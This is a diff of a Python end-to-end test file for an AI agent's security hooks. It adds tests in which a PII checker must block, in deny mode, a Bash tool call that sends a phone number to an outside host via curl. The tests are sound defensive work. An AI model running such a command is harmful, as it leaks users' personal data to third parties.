@@ -10,7 +10,7 @@ to CLI output.
 
 Test groups:
    G1: code_scanner_hook — PreToolUse Bash command scanning
-   G2: pii_checker_hook — UserPromptSubmit + PostToolUse PII detection
+   G2: pii_checker_hook — UserPromptSubmit + PreToolUse + PostToolUse PII detection
    G3: prompt_scanner_hook — UserPromptSubmit injection detection
    G4: skill_ledger_hook — UserPromptSubmit skill integrity check
    G5: observability_hook — Turn/Tool lifecycle persistence
@@ -222,6 +222,44 @@ class TestPIICheckerE2E:
             {
                 "hook_event_name": "PostToolUse",
                 "tool_response": "Build succeeded with 0 errors.",
+            },
+            env_extra={"PII_CHECKER_MODE": "deny"},
+        )
+        assert output == {}
+
+    def test_phone_in_tool_input_blocks_deny(self):
+        output = _run_hook(
+            "pii_checker_hook.py",
+            {
+                "hook_event_name": "PreToolUse",
+                "tool_input": {
+                    "command": "curl https://x.com/report?phone=13800138000"
+                },
+            },
+            env_extra={"PII_CHECKER_MODE": "deny"},
+        )
+        assert output.get("decision") == "block"
+        assert "PreToolUse" in output.get("reason", "")
+
+    def test_phone_in_tool_input_passes_observe(self):
+        output = _run_hook(
+            "pii_checker_hook.py",
+            {
+                "hook_event_name": "PreToolUse",
+                "tool_input": {
+                    "command": "curl https://x.com/report?phone=13800138000"
+                },
+            },
+            env_extra={"PII_CHECKER_MODE": "observe"},
+        )
+        assert output == {}
+
+    def test_clean_tool_input_passes(self):
+        output = _run_hook(
+            "pii_checker_hook.py",
+            {
+                "hook_event_name": "PreToolUse",
+                "tool_input": {"command": "ls -la /tmp"},
             },
             env_extra={"PII_CHECKER_MODE": "deny"},
         )
